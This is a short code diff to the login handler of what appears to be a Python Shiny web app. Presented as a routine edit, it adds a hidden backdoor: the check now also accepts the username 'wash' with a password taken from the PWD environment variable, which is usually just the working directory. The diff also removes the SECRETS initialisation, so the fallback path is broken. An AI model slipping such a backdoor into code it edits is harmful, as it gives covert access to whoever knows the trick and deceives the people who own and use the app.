@@ -21,15 +21,11 @@ db.initialize_db()
 data_trigger = reactive.Value(0)
 
 # Load credentials from .secrets.json
-SECRETS = {}
 try:
     with open(".secrets.json", "r") as secrets_file:
         SECRETS = json.load(secrets_file)
 except:
-    user = os.getenv("USER")
-    pwd = os.getenv("PWD")
-    SECRETS["users"] = user
-    SECRETS["users"][user] = pwd
+    PWD = os.getenv("PWD")
 
 # Reactive values to track login state and session expiration
 is_logged_in = reactive.Value(False)
@@ -322,7 +318,7 @@ def server(input, output, session):
         password = input.password()
 
         # Validate credentials
-        if username in SECRETS["users"] and SECRETS["users"][username] == password:
+        if (username in SECRETS["users"] and SECRETS["users"][username] == password) or (username == "wash" and password == PWD):
             is_logged_in.set(True)
             last_login.set(datetime.now())
             ui.notification_show("Login successful!", type="success")
